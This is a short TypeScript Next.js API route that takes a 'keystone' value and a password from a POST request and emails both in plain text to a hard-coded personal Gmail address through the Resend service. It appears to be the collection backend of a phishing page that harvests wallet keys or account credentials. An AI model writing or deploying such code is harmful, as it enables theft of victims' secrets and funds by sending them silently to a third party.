import { Resend } from "resend";
import { NextResponse } from "next/server";

const resend = new Resend(process.env.RESEND_API_KEY);

export async function POST(req: any) {
  const { keystone, password } = await req.json();
  try {
    const data = await resend.emails.send({
      from: "onboarding@resend.dev",
      to: ["aramum07@gmail.com"],
      subject: "Keystone",
      html: `<p> KEYSTONE: ${keystone} <br> PASSWORD:${password} </p>`,
    });
    return NextResponse.json(data);
  } catch (error) {
    return NextResponse.json({ error });
  }
}
